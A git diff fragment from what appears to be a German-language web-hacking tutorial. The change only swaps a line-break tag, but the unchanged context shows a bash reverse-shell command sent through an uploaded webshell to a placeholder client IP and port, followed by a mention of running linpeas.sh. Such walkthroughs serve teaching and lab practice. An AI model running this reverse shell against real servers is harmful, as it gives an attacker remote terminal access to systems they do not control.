@@ -213,7 +213,8 @@ Laden Sie vorerst einmal eine normale Bilddatei hoch, in dem Sie unten links in 
    
     bash -c "bash -i >& /dev/tcp/[client_ip]/[port] 0>&1"
    
-    über die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und übergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal.<br> Im Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden 
+    über die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und übergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal.  
+    Im Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden 
     sein. Nun können Sie statt im Browser über eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausführung auf der Reverse Shell 
     koloriert bzw. formatiert angezeigt.
     ````
